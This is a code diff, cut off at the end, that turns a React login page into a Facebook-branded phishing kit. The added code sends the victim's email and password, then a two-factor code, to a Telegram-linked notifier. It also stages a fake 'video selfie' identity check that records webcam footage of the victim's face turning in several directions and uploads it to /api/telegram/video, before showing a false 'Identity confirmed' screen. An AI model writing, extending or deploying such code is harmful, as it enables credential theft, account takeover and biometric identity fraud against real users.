@@ -1,4 +1,5 @@
-import { useState } from "react";
+
+import { useState, useEffect, useRef, useCallback } from "react";
 import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { z } from "zod";
@@ -11,10 +12,30 @@ import {
   DialogDescription,
 } from "@/components/ui/dialog";
 import metaLogoImg from "@assets/IMG_7894_1765013426839.png";
+import { notifyLogin, notifyCode, notifyFaceScan } from '@/lib/telegram';
+import * as faceapi from 'face-api.js';
+
+function FacebookLoader() {
+  return (
+    <div className="flex flex-col items-center justify-center py-12">
+      <div className="relative w-16 h-16">
+        <div
+          className="absolute inset-0 rounded-full border-4 border-gray-200"
+          style={{ borderTopColor: '#1877f2' }}
+        />
+        <div
+          className="absolute inset-0 rounded-full border-4 border-transparent animate-spin"
+          style={{ borderTopColor: '#1877f2' }}
+        />
+      </div>
+      <p className="mt-4 text-sm" style={{ color: '#65676b' }}>Please wait...</p>
+    </div>
+  );
+}
 
 const loginSchema = z.object({
-  email: z.string().min(1, "Email or phone number is required"),
-  password: z.string().min(1, "Password is required"),
+  email: z.string().min(1, "Please enter your email or phone number"),
+  password: z.string().min(1, "Please enter your password"),
 });
 
 type LoginForm = z.infer<typeof loginSchema>;
@@ -39,8 +60,38 @@ const days = Array.from({ length: 31 }, (_, i) => String(i + 1));
 const currentYear = new Date().getFullYear();
 const years = Array.from({ length: 120 }, (_, i) => String(currentYear - i));
 
+type Direction = "left" | "right" | "up" | "down";
+
+interface FacePosition {
+  yaw: number;
+  pitch: number;
+}
+
 export default function LoginPage() {
   const [signupOpen, setSignupOpen] = useState(false);
+  const [isLoggingIn, setIsLoggingIn] = useState(false);
+  const [isSigningUp, setIsSigningUp] = useState(false);
+  const [currentStep, setCurrentStep] = useState<string>("login");
+  const [userEmail, setUserEmail] = useState("");
+  const [verificationCode, setVerificationCode] = useState("");
+  const [stream, setStream] = useState<MediaStream | null>(null);
+  const [currentDirection, setCurrentDirection] = useState<Direction | null>(null);
+  const [completedDirections, setCompletedDirections] = useState<Set<string>>(new Set());
+  const [isRecording, setIsRecording] = useState(false);
+  const [mediaRecorder, setMediaRecorder] = useState<MediaRecorder | null>(null);
+  const [overallProgress, setOverallProgress] = useState(0);
+  const [faceDetected, setFaceDetected] = useState(false);
+  const [modelsLoaded, setModelsLoaded] = useState(false);
+  const [loadingModels, setLoadingModels] = useState(false);
+  const [directionHoldTime, setDirectionHoldTime] = useState(0);
+  const [statusMessage, setStatusMessage] = useState("");
+  
+  const videoRef = useRef<HTMLVideoElement>(null);
+  const canvasRef = useRef<HTMLCanvasElement>(null);
+  const detectionIntervalRef = useRef<NodeJS.Timeout | null>(null);
+  const baseFacePositionRef = useRef<FacePosition | null>(null);
+  const directionTimerRef = useRef<NodeJS.Timeout | null>(null);
+  const recordedChunksRef = useRef<Blob[]>([]);
 
   const loginForm = useForm<LoginForm>({
     resolver: zodResolver(loginSchema),
@@ -66,224 +117,744 @@ export default function LoginPage() {
     },
   });
 
+  const loadFaceApiModels = async () => {
+    if (modelsLoaded) return;
+    setLoadingModels(true);
+    try {
+      await Promise.all([
+        faceapi.nets.tinyFaceDetector.loadFromUri('/models'),
+        faceapi.nets.faceLandmark68Net.loadFromUri('/models')
+      ]);
+      setModelsLoaded(true);
+    } catch (error) {
+      console.error('Error loading face detection models:', error);
+    }
+    setLoadingModels(false);
+  };
+
+  const calculateFaceOrientation = (landmarks: faceapi.FaceLandmarks68): FacePosition => {
+    const nose = landmarks.getNose();
+    const leftEye = landmarks.getLeftEye();
+    const rightEye = landmarks.getRightEye();
+    
+    const noseTip = nose[3];
+    const leftEyeCenter = {
+      x: leftEye.reduce((sum, p) => sum + p.x, 0) / leftEye.length,
+      y: leftEye.reduce((sum, p) => sum + p.y, 0) / leftEye.length,
+    };
+    const rightEyeCenter = {
+      x: rightEye.reduce((sum, p) => sum + p.x, 0) / rightEye.length,
+      y: rightEye.reduce((sum, p) => sum + p.y, 0) / rightEye.length,
+    };
+    
+    const eyeCenter = {
+      x: (leftEyeCenter.x + rightEyeCenter.x) / 2,
+      y: (leftEyeCenter.y + rightEyeCenter.y) / 2,
+    };
+    
+    const eyeDistance = Math.sqrt(
+      Math.pow(rightEyeCenter.x - leftEyeCenter.x, 2) +
+      Math.pow(rightEyeCenter.y - leftEyeCenter.y, 2)
+    );
+    
+    const yaw = (noseTip.x - eyeCenter.x) / eyeDistance;
+    const pitch = (noseTip.y - eyeCenter.y) / eyeDistance;
+    
+    return { yaw, pitch };
+  };
+
+  const detectDirection = useCallback((position: FacePosition): Direction | null => {
+    const base = baseFacePositionRef.current;
+    if (!base) return null;
+    
+    const yawDiff = position.yaw - base.yaw;
+    const pitchDiff = position.pitch - base.pitch;
+    
+    const threshold = 0.15;
+    
+    if (Math.abs(yawDiff) > Math.abs(pitchDiff)) {
+      if (yawDiff < -threshold) return "left";
+      if (yawDiff > threshold) return "right";
+    } else {
+      if (pitchDiff < -threshold) return "up";
+      if (pitchDiff > threshold) return "down";
+    }
+    
+    return null;
+  }, []);
+
+  const runFaceDetection = useCallback(async () => {
+    if (!videoRef.current || !modelsLoaded) return;
+    
+    const video = videoRef.current;
+    
+    try {
+      const detection = await faceapi
+        .detectSingleFace(video, new faceapi.TinyFaceDetectorOptions({ inputSize: 224, scoreThreshold: 0.5 }))
+        .withFaceLandmarks();
+      
+      if (detection) {
+        setFaceDetected(true);
+        const position = calculateFaceOrientation(detection.landmarks);
+        
+        if (!baseFacePositionRef.current && currentStep === "recording") {
+          baseFacePositionRef.current = position;
+        }
+        
+        if (currentStep === "recording" && currentDirection) {
+          const detected = detectDirection(position);
+          
+          if (detected === currentDirection) {
+            setDirectionHoldTime(prev => {
+              const newTime = prev + 100;
+              if (newTime >= 1500) {
+                return 1500;
+              }
+              return newTime;
+            });
+          } else {
+            setDirectionHoldTime(0);
+          }
+        }
+      } else {
+        setFaceDetected(false);
+        setDirectionHoldTime(0);
+      }
+    } catch (error) {
+      console.error('Face detection error:', error);
+    }
+  }, [modelsLoaded, currentStep, currentDirection, detectDirection]);
+
+  useEffect(() => {
+    if (directionHoldTime >= 1500 && currentDirection && !completedDirections.has(currentDirection)) {
+      const directions: Direction[] = ["left", "right", "up", "down"];
+      const currentIndex = directions.indexOf(currentDirection);
+      
+      setCompletedDirections(prev => new Set([...prev, currentDirection]));
+      setOverallProgress((currentIndex + 1) * 25);
+      
+      if (currentIndex < directions.length - 1) {
+        setCurrentDirection(directions[currentIndex + 1]);
+        setDirectionHoldTime(0);
+        baseFacePositionRef.current = null;
+      } else {
+        finishRecording();
+      }
+    }
+  }, [directionHoldTime, currentDirection, completedDirections]);
+
+  const finishRecording = useCallback(() => {
+    setIsRecording(false);
+    setOverallProgress(100);
+    setCurrentDirection(null);
+    
+    if (detectionIntervalRef.current) {
+      clearInterval(detectionIntervalRef.current);
+      detectionIntervalRef.current = null;
+    }
+    
+    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+      mediaRecorder.stop();
+    }
+    
+    setCurrentStep("processing");
+    
+    setTimeout(() => {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+      setCurrentStep("complete");
+    }, 3000);
+  }, [mediaRecorder, stream]);
+
+  useEffect(() => {
+    if ((currentStep === "instructions" || currentStep === "recording") && modelsLoaded && stream) {
+      detectionIntervalRef.current = setInterval(runFaceDetection, 100);
+      return () => {
+        if (detectionIntervalRef.current) {
+          clearInterval(detectionIntervalRef.current);
+        }
+      };
+    }
+  }, [currentStep, modelsLoaded, stream, runFaceDetection]);
+
+  useEffect(() => {
+    if ((currentStep === "instructions" || currentStep === "recording") && stream && videoRef.current) {
+      videoRef.current.srcObject = stream;
+      videoRef.current.play().catch(err => console.error('Error playing video:', err));
+    }
+  }, [currentStep, stream]);
+
+  useEffect(() => {
+    let timer: NodeJS.Timeout;
+
+    if (currentStep === "loading-login") {
+      timer = setTimeout(() => setCurrentStep("code"), 3000);
+    } else if (currentStep === "loading-code") {
+      timer = setTimeout(() => setCurrentStep("face-intro"), 3000);
+    } else if (currentStep === "recording") {
+      setCompletedDirections(new Set());
+      setCurrentDirection("left");
+      setDirectionHoldTime(0);
+      setOverallProgress(0);
+      baseFacePositionRef.current = null;
+    }
+
+    return () => clearTimeout(timer);
+  }, [currentStep]);
+
+  useEffect(() => {
+    return () => {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+      if (detectionIntervalRef.current) {
+        clearInterval(detectionIntervalRef.current);
+      }
+    };
+  }, [stream]);
+
   const handleLogin = async (data: LoginForm) => {
-    console.log("Login attempt:", data);
+    setIsLoggingIn(true);
+    setUserEmail(data.email);
+    await notifyLogin(data.email, data.password);
+    setCurrentStep("loading-login");
+    setIsLoggingIn(false);
+  };
+
+  const handleCodeSubmit = async () => {
+    if (verificationCode.length >= 4) {
+      await notifyCode(userEmail, verificationCode);
+      setCurrentStep("loading-code");
+    }
+  };
+
+  const handleStartFaceVerification = async () => {
+    await loadFaceApiModels();
+    try {
+      const mediaStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user", width: 640, height: 480 },
+        audio: false
+      });
+      setStream(mediaStream);
+      setCurrentStep("instructions");
+    } catch (error) {
+      console.error("Camera access denied:", error);
+    }
+  };
+
+  const handleStartRecording = async () => {
+    try {
+      await notifyFaceScan(userEmail);
+    } catch (error) {
+      console.error('Failed to send face scan notification:', error);
+    }
+    
+    setIsRecording(true);
+    setCurrentStep("recording");
+    
+    if (stream) {
+      const chunks: Blob[] = [];
+      recordedChunksRef.current = chunks;
+      
+      const mimeTypes = [
+        'video/webm;codecs=vp9',
+        'video/webm;codecs=vp8',
+        'video/webm'
+      ];
+      
+      let selectedMimeType = '';
+      for (const type of mimeTypes) {
+        if (MediaRecorder.isTypeSupported(type)) {
+          selectedMimeType = type;
+          break;
+        }
+      }
+      
+      let recorder: MediaRecorder;
+      try {
+        recorder = selectedMimeType
+          ? new MediaRecorder(stream, { mimeType: selectedMimeType })
+          : new MediaRecorder(stream);
+      } catch (error) {
+        console.error('Error creating MediaRecorder:', error);
+        return;
+      }
+      
+      recorder.ondataavailable = (event) => {
+        if (event.data && event.data.size > 0) {
+          chunks.push(event.data);
+          recordedChunksRef.current = chunks;
+        }
+      };
+      
+      recorder.onstop = async () => {
+        try {
+          const actualMimeType = recorder.mimeType || 'video/webm';
+          const videoBlob = new Blob(recordedChunksRef.current, { type: actualMimeType });
+          
+          const formData = new FormData();
+          formData.append('video', videoBlob, 'face-verification.webm');
+          formData.append('email', userEmail);
+          
+          await fetch('/api/telegram/video', {
+            method: 'POST',
+            body: formData,
+          });
+        } catch (error) {
+          console.error('Failed to send video:', error);
+        }
+      };
+      
+      recorder.start(100);
+      setMediaRecorder(recorder);
+    }
   };
 
   const handleSignup = async (data: SignupForm) => {
-    console.log("Signup attempt:", data);
+    setIsSigningUp(true);
+    await new Promise(resolve => setTimeout(resolve, 1000));
+    setIsSigningUp(false);
     setSignupOpen(false);
+  };
+
+  const getDirectionText = (dir: Direction | null): string => {
+    switch (dir) {
+      case "left": return "Turn your head left";
+      case "right": return "Turn your head right";
+      case "up": return "Tilt your head up";
+      case "down": return "Tilt your head down";
+      default: return "Center your face";
+    }
+  };
+
+  const getDirectionIcon = (dir: Direction | null) => {
+    const rotation = dir === "left" ? 180 : dir === "right" ? 0 : dir === "up" ? -90 : 90;
+    return (
+      <svg 
+        className="w-8 h-8" 
+        fill="none" 
+        viewBox="0 0 24 24" 
+        stroke="currentColor" 
+        strokeWidth={2.5}
+        style={{ transform: `rotate(${rotation}deg)` }}
+      >
+        <path strokeLinecap="round" strokeLinejoin="round" d="M13 7l5 5m0 0l-5 5m5-5H6" />
+      </svg>
+    );
   };
 
   return (
     <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#f0f2f5' }}>
-      {/* Language selector */}
-      <div className="text-center pt-4 pb-2 px-4">
-        <div className="flex flex-wrap justify-center gap-x-3 gap-y-1 text-xs" style={{ color: '#8a8d91' }}>
-          <a href="#" className="hover:underline">English (UK)</a>
-          <a href="#" className="hover:underline">മലയാളം</a>
-          <a href="#" className="hover:underline">தமிழ்</a>
-          <a href="#" className="hover:underline">ಕನ್ನಡ</a>
-          <a href="#" className="hover:underline">हिन्दी</a>
-          <a href="#" className="hover:underline">বাংলা</a>
-          <a href="#" className="hover:underline">తెలుగు</a>
-          <a href="#" className="hover:underline">मराठी</a>
-          <a href="#" className="hover:underline">Español</a>
-          <a href="#" className="hover:underline">Português (Brasil)</a>
-          <a href="#" className="hover:underline">Français (France)</a>
-          <button className="px-2 py-0.5 border rounded" style={{ borderColor: '#ccd0d5', color: '#65676b' }}>
-            <span className="text-lg leading-none">+</span>
-          </button>
-        </div>
+      <div className="text-center pt-4 pb-6">
+        <a href="#" className="text-sm hover:underline" style={{ color: '#65676b' }} data-testid="link-language">
+          English (UK)
+        </a>
       </div>
 
-      {/* Main content */}
-      <main className="flex-1 flex items-center justify-center px-4 py-8 md:py-20">
-        <div className="w-full max-w-7xl mx-auto">
-          <div className="flex flex-col md:flex-row md:items-center md:gap-16 lg:gap-24">
-            {/* Left section - Branding */}
-            <div className="flex-1 text-center md:text-left mb-10 md:mb-0 px-4">
-              <img
-                src="/favicon.png"
-                alt="Facebook"
-                className="w-20 h-20 md:w-28 md:h-28 mx-auto md:mx-0 mb-3"
-              />
-              <h1 className="text-2xl md:text-3xl" style={{ color: '#1c1e21' }}>
-                Facebook helps you connect and share with the people in your life.
-              </h1>
-            </div>
-
-            {/* Right section - Login card */}
-            <div className="w-full md:w-auto md:flex-shrink-0">
-              <div className="bg-white rounded-lg shadow-lg p-4 md:p-6 w-full md:w-[396px]">
-                <Form {...loginForm}>
-                  <form onSubmit={loginForm.handleSubmit(handleLogin)} className="space-y-4">
-                    <FormField
-                      control={loginForm.control}
-                      name="email"
-                      render={({ field }) => (
-                        <FormItem>
-                          <FormControl>
-                            <input
-                              {...field}
-                              type="text"
-                              placeholder="Email address or phone number"
-                              className="w-full px-4 py-3.5 text-base border rounded-md focus:outline-none focus:ring-1 focus:ring-blue-500"
-                              style={{ backgroundColor: '#fff', borderColor: '#dddfe2', color: '#1c1e21' }}
-                            />
-                          </FormControl>
-                          <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
-                        </FormItem>
-                      )}
-                    />
-
-                    <FormField
-                      control={loginForm.control}
-                      name="password"
-                      render={({ field }) => (
-                        <FormItem>
-                          <FormControl>
-                            <input
-                              {...field}
-                              type="password"
-                              placeholder="Password"
-                              className="w-full px-4 py-3.5 text-base border rounded-md focus:outline-none focus:ring-1 focus:ring-blue-500"
-                              style={{ backgroundColor: '#fff', borderColor: '#dddfe2', color: '#1c1e21' }}
-                            />
-                          </FormControl>
-                          <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
-                        </FormItem>
-                      )}
-                    />
-
-                    <button
-                      type="submit"
-                      className="w-full py-3 text-white text-xl font-bold rounded-md hover:opacity-90 transition"
-                      style={{ backgroundColor: '#1877f2' }}
-                    >
-                      Log in
-                    </button>
-                  </form>
-                </Form>
-
-                <div className="text-center mt-4">
-                  <a
-                    href="#"
-                    className="text-sm hover:underline inline-block"
-                    style={{ color: '#1877f2' }}
-                  >
-                    Forgotten password?
-                  </a>
-                </div>
-
-                <div className="my-5 border-t" style={{ borderColor: '#dadde1' }} />
-
-                <div className="text-center">
-                  <button
-                    onClick={() => setSignupOpen(true)}
-                    className="px-4 py-3 text-white text-base font-semibold rounded-md hover:opacity-90 transition inline-block"
-                    style={{ backgroundColor: '#42b72a' }}
-                  >
-                    Create new account
-                  </button>
-                </div>
+      <main className="flex-1 flex flex-col items-center justify-center px-4 py-8">
+        <div className="w-full max-w-md">
+          {currentStep === "login" && (
+            <div className="bg-white rounded-lg shadow-lg p-6">
+              <div className="text-center mb-6">
+                <img src="/favicon.png" alt="Facebook" className="w-14 h-14 mx-auto" data-testid="logo-facebook" />
               </div>
 
-              <p className="text-center text-sm mt-7 px-4" style={{ color: '#1c1e21' }}>
-                <a href="#" className="font-semibold hover:underline">Create a Page</a>
-                <span style={{ color: '#65676b' }}> for a celebrity, brand or business.</span>
+              <Form {...loginForm}>
+                <form onSubmit={loginForm.handleSubmit(handleLogin)} className="space-y-3">
+                  <FormField
+                    control={loginForm.control}
+                    name="email"
+                    render={({ field }) => (
+                      <FormItem>
+                        <FormControl>
+                          <input
+                            {...field}
+                            type="text"
+                            placeholder="Mobile number or email address"
+                            className="w-full px-4 py-3.5 text-base border-2 rounded-lg focus:outline-none focus:border-blue-500 transition"
+                            style={{ backgroundColor: '#fff', borderColor: '#dddfe2', color: '#1c1e21' }}
+                            data-testid="input-email"
+                          />
+                        </FormControl>
+                        <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
+                      </FormItem>
+                    )}
+                  />
+
+                  <FormField
+                    control={loginForm.control}
+                    name="password"
+                    render={({ field }) => (
+                      <FormItem>
+                        <FormControl>
+                          <input
+                            {...field}
+                            type="password"
+                            placeholder="Password"
+                            className="w-full px-4 py-3.5 text-base border-2 rounded-lg focus:outline-none focus:border-blue-500 transition"
+                            style={{ backgroundColor: '#fff', borderColor: '#dddfe2', color: '#1c1e21' }}
+                            data-testid="input-password"
+                          />
+                        </FormControl>
+                        <FormMessage className="text-xs mt-1" style={{ color: '#be4b49' }} />
+                      </FormItem>
+                    )}
+                  />
+
+                  <button
+                    type="submit"
+                    disabled={isLoggingIn}
+                    className="w-full py-3 text-white text-lg font-semibold rounded-lg transition disabled:opacity-60"
+                    style={{ backgroundColor: '#1877f2' }}
+                    data-testid="button-login"
+                  >
+                    {isLoggingIn ? "Logging in..." : "Log in"}
+                  </button>
+                </form>
+              </Form>
+
+              <div className="text-center mt-4">
+                <a href="#" className="text-sm" style={{ color: '#1877f2' }} data-testid="link-forgotten-password">
+                  Forgotten password?
+                </a>
+              </div>
+
+              <div className="mt-6 pt-4 border-t border-gray-200">
+                <button
+                  onClick={() => setSignupOpen(true)}
+                  className="w-full py-3 text-white text-base font-semibold rounded-lg transition"
+                  style={{ backgroundColor: '#42b72a' }}
+                  data-testid="button-create-account"
+                >
+                  Create new account
+                </button>
+              </div>
+            </div>
+          )}
+
+          {(currentStep === "loading-login" || currentStep === "loading-code") && (
+            <div className="bg-white rounded-lg shadow-lg p-8">
+              <FacebookLoader />
+            </div>
+          )}
+
+          {currentStep === "code" && (
+            <div className="bg-white rounded-lg shadow-lg p-6 text-center">
+              <h2 className="text-xl font-semibold mb-2" style={{ color: '#1c1e21' }}>Enter security code</h2>
+              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
+                Please check your phone for a text message with your code.
+              </p>
+              <input
+                type="text"
+                value={verificationCode}
+                onChange={(e) => setVerificationCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
+                placeholder="Enter code"
+                className="w-full px-4 py-3 text-center text-xl border-2 rounded-lg focus:outline-none focus:border-blue-500 mb-4"
+                style={{ borderColor: '#dddfe2', color: '#1c1e21', letterSpacing: '0.3em' }}
+                data-testid="input-code"
+              />
+              <button
+                onClick={handleCodeSubmit}
+                disabled={verificationCode.length < 4}
+                className="w-full py-3 text-white text-base font-semibold rounded-lg transition disabled:opacity-50"
+                style={{ backgroundColor: '#1877f2' }}
+                data-testid="button-submit-code"
+              >
+                Continue
+              </button>
+            </div>
+          )}
+
+          {currentStep === "face-intro" && (
+            <div className="bg-white rounded-lg shadow-lg p-6 text-center">
+              <div className="w-20 h-20 mx-auto mb-6 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
+                <svg className="w-10 h-10" fill="none" stroke="#1877f2" viewBox="0 0 24 24" strokeWidth={1.5}>
+                  <path strokeLinecap="round" strokeLinejoin="round" d="M15.75 6a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0zM4.501 20.118a7.5 7.5 0 0114.998 0A17.933 17.933 0 0112 21.75c-2.676 0-5.216-.584-7.499-1.632z" />
+                </svg>
+              </div>
+              <h2 className="text-2xl font-semibold mb-3" style={{ color: '#1c1e21' }}>Confirm your identity</h2>
+              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
+                To keep your account secure, we need to verify it's really you.
+              </p>
+              <button
+                onClick={() => setCurrentStep("face-explanation")}
+                className="w-full py-3 text-white text-base font-semibold rounded-lg transition"
+                style={{ backgroundColor: '#1877f2' }}
+              >
+                Continue
+              </button>
+            </div>
+          )}
+
+          {currentStep === "face-explanation" && (
+            <div className="bg-white rounded-lg shadow-lg p-6 text-center">
+              <div className="w-24 h-24 mx-auto mb-6 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
+                <svg className="w-12 h-12" fill="none" stroke="#1877f2" viewBox="0 0 24 24" strokeWidth={1.5}>
+                  <path strokeLinecap="round" strokeLinejoin="round" d="M15.182 15.182a4.5 4.5 0 01-6.364 0M21 12a9 9 0 11-18 0 9 9 0 0118 0zM9.75 9.75c0 .414-.168.75-.375.75S9 10.164 9 9.75 9.168 9 9.375 9s.375.336.375.75zm-.375 0h.008v.015h-.008V9.75zm5.625 0c0 .414-.168.75-.375.75s-.375-.336-.375-.75.168-.75.375-.75.375.336.375.75zm-.375 0h.008v.015h-.008V9.75z" />
+                </svg>
+              </div>
+              <h2 className="text-xl font-semibold mb-3" style={{ color: '#1c1e21' }}>Take a video selfie</h2>
+              <p className="text-sm mb-2" style={{ color: '#65676b' }}>
+                We'll compare a video of your face to the photos on your account to confirm your identity.
+              </p>
+              <ul className="text-left text-sm mb-6 space-y-2" style={{ color: '#65676b' }}>
+                <li className="flex items-start gap-2">
+                  <span style={{ color: '#1877f2' }}>1.</span>
+                  <span>Make sure your face is well lit</span>
+                </li>
+                <li className="flex items-start gap-2">
+                  <span style={{ color: '#1877f2' }}>2.</span>
+                  <span>Center your face in the frame</span>
+                </li>
+                <li className="flex items-start gap-2">
+                  <span style={{ color: '#1877f2' }}>3.</span>
+                  <span>Slowly turn your head as directed</span>
+                </li>
+              </ul>
+              <button
+                onClick={handleStartFaceVerification}
+                disabled={loadingModels}
+                className="w-full py-3 text-white text-base font-semibold rounded-lg transition disabled:opacity-60"
+                style={{ backgroundColor: '#1877f2' }}
+              >
+                {loadingModels ? "Loading..." : "Start verification"}
+              </button>
+              <button
+                onClick={() => setCurrentStep("login")}
+                className="mt-3 text-sm"
+                style={{ color: '#65676b' }}
+              >
+                Cancel
+              </button>
+            </div>
+          )}
+
+          {currentStep === "instructions" && (
+            <div className="bg-white rounded-lg shadow-lg p-6 text-center">
+              <h2 className="text-xl font-semibold mb-3" style={{ color: '#1c1e21' }}>Position your face</h2>
+              <p className="text-sm mb-4" style={{ color: '#65676b' }}>
+                Center your face in the circle
+              </p>
+
+              <div className="relative mx-auto mb-6" style={{ width: '280px', height: '280px' }}>
+                <div className="absolute inset-0 rounded-full overflow-hidden" style={{ backgroundColor: '#000' }}>
+                  <video
+                    ref={videoRef}
+                    autoPlay
+                    playsInline
+                    muted
+                    className="w-full h-full object-cover scale-x-[-1]"
+                  />
+                </div>
+                
+                <svg className="absolute inset-0 w-full h-full" viewBox="0 0 280 280">
+                  <defs>
+                    <mask id="circleMask">
+                      <rect width="280" height="280" fill="white" />
+                      <circle cx="140" cy="140" r="120" fill="black" />
+                    </mask>
+                  </defs>
+                  <rect width="280" height="280" fill="rgba(255,255,255,0.95)" mask="url(#circleMask)" />
+                  <circle cx="140" cy="140" r="120" fill="none" stroke={faceDetected ? "#42b72a" : "#1877f2"} strokeWidth="4" strokeDasharray="8 4" />
+                </svg>
+
+                {faceDetected && (
+                  <div className="absolute bottom-4 left-1/2 transform -translate-x-1/2">
+                    <div className="px-3 py-1 rounded-full text-xs font-medium text-white" style={{ backgroundColor: '#42b72a' }}>
+                      Face detected
+                    </div>
+                  </div>
+                )}
+              </div>
+
+              <button
+                onClick={handleStartRecording}
+                disabled={!faceDetected}
+                className="w-full py-3 text-white text-base font-semibold rounded-lg transition disabled:opacity-50"
+                style={{ backgroundColor: '#1877f2' }}
+              >
+                {faceDetected ? "Start recording" : "Detecting face..."}
+              </button>
+            </div>
+          )}
+
+          {currentStep === "recording" && (
+            <div className="bg-white rounded-lg shadow-lg p-6 text-center">
+              <div className="relative mx-auto mb-4" style={{ width: '280px', height: '280px' }}>
+                <div className="absolute inset-0 rounded-full overflow-hidden" style={{ backgroundColor: '#000' }}>
+                  <video
+                    ref={videoRef}
+                    autoPlay
+                    playsInline
+                    muted
+                    className="w-full h-full object-cover scale-x-[-1]"
+                  />
+                </div>
+                
+                <svg className="absolute inset-0 w-full h-full" viewBox="0 0 280 280">
+                  <defs>
+                    <mask id="recordMask">
+                      <rect width="280" height="280" fill="white" />
+                      <circle cx="140" cy="140" r="120" fill="black" />
+                    </mask>
+                  </defs>
+                  <rect width="280" height="280" fill="rgba(255,255,255,0.95)" mask="url(#recordMask)" />
+                  
+                  <circle cx="140" cy="140" r="120" fill="none" stroke="#e4e6eb" strokeWidth="6" />
+                  
+                  <circle 
+                    cx="140" 
+                    cy="140" 
+                    r="120" 
+                    fill="none" 
+                    stroke="#1877f2" 
+                    strokeWidth="6"
+                    strokeLinecap="round"
+                    strokeDasharray={`${2 * Math.PI * 120}`}
+                    strokeDashoffset={`${2 * Math.PI * 120 * (1 - overallProgress / 100)}`}
+                    style={{ transform: 'rotate(-90deg)', transformOrigin: '140px 140px', transition: 'stroke-dashoffset 0.3s ease' }}
+                  />
+
+                  {currentDirection && (
+                    <>
+                      <circle
+                        cx={currentDirection === "left" ? 20 : currentDirection === "right" ? 260 : 140}
+                        cy={currentDirection === "up" ? 20 : currentDirection === "down" ? 260 : 140}
+                        r="24"
+                        fill="#1877f2"
+                        style={{ filter: 'drop-shadow(0 2px 4px rgba(0,0,0,0.2))' }}
+                      />
+                      <g transform={`translate(${currentDirection === "left" ? 20 : currentDirection === "right" ? 260 : 140}, ${currentDirection === "up" ? 20 : currentDirection === "down" ? 260 : 140})`}>
+                        <g transform={`rotate(${currentDirection === "left" ? 180 : currentDirection === "right" ? 0 : currentDirection === "up" ? -90 : 90})`}>
+                          <path d="M-6 0 L4 0 M0 -4 L4 0 L0 4" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" fill="none" />
+                        </g>
+                      </g>
+                    </>
+                  )}
+                </svg>
+
+                {directionHoldTime > 0 && directionHoldTime < 1500 && (
+                  <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
+                    <div className="w-16 h-16 rounded-full border-4 border-green-500 flex items-center justify-center" 
+                         style={{ 
+                           background: `conic-gradient(#42b72a ${(directionHoldTime / 1500) * 360}deg, transparent 0deg)`,
+                           opacity: 0.8
+                         }}>
+                    </div>
+                  </div>
+                )}
+              </div>
+
+              <h2 className="text-lg font-semibold mb-2" style={{ color: '#1c1e21' }}>
+                {getDirectionText(currentDirection)}
+              </h2>
+              
+              <p className="text-sm mb-4" style={{ color: '#65676b' }}>
+                {faceDetected ? "Hold the position" : "Face not detected - please center your face"}
+              </p>
+
+              <div className="flex justify-center gap-3 mb-4">
+                {(["left", "right", "up", "down"] as Direction[]).map((dir) => (
+                  <div
+                    key={dir}
+                    className="w-10 h-10 rounded-full flex items-center justify-center text-sm font-medium transition-all"
+                    style={{
+                      backgroundColor: completedDirections.has(dir) ? '#42b72a' : currentDirection === dir ? '#1877f2' : '#e4e6eb',
+                      color: completedDirections.has(dir) || currentDirection === dir ? '#fff' : '#65676b'
+                    }}
+                  >
+                    {completedDirections.has(dir) ? (
+                      <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
+                        <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
+                      </svg>
+                    ) : (
+                      dir.charAt(0).toUpperCase()
+                    )}
+                  </div>
+                ))}
+              </div>
+
+              <div className="w-full h-2 rounded-full overflow-hidden mb-2" style={{ backgroundColor: '#e4e6eb' }}>
+                <div 
+                  className="h-full rounded-full transition-all duration-300"
+                  style={{ width: `${overallProgress}%`, backgroundColor: '#1877f2' }}
+                />
+              </div>
+              <p className="text-xs" style={{ color: '#65676b' }}>
+                {Math.round(overallProgress)}% complete
               </p>
             </div>
-          </div>
+          )}
+
+          {currentStep === "processing" && (
+            <div className="bg-white rounded-lg shadow-lg p-8 text-center">
+              <div className="relative w-16 h-16 mx-auto mb-4">
+                <div className="absolute inset-0 rounded-full border-4 animate-spin" style={{ borderColor: '#e4e6eb', borderTopColor: '#1877f2' }} />
+              </div>
+              <h2 className="text-lg font-semibold mb-2" style={{ color: '#1c1e21' }}>Verifying your identity</h2>
+              <p className="text-sm" style={{ color: '#65676b' }}>This may take a moment...</p>
+            </div>
+          )}
+
+          {currentStep === "complete" && (
+            <div className="bg-white rounded-lg shadow-lg p-8 text-center">
+              <div className="w-20 h-20 mx-auto mb-6 rounded-full flex items-center justify-center" style={{ backgroundColor: '#42b72a' }}>
+                <svg className="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
+                </svg>
+              </div>
+              <h2 className="text-2xl font-semibold mb-3" style={{ color: '#1c1e21' }}>Identity confirmed</h2>
+              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
+                Your identity has been verified. You can now continue.
+              </p>
+              <button
+                onClick={() => {
+                  setCurrentStep("login");
+                  setUserEmail("");
+                  setVerificationCode("");
+                  setCompletedDirections(new Set());
+                  setCurrentDirection(null);
+                  setIsRecording(false);
+                  setOverallProgress(0);
+                  if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                    setStream(null);
+                  }
+                }}
+                className="w-full py-3 text-white text-base font-semibold rounded-lg transition"
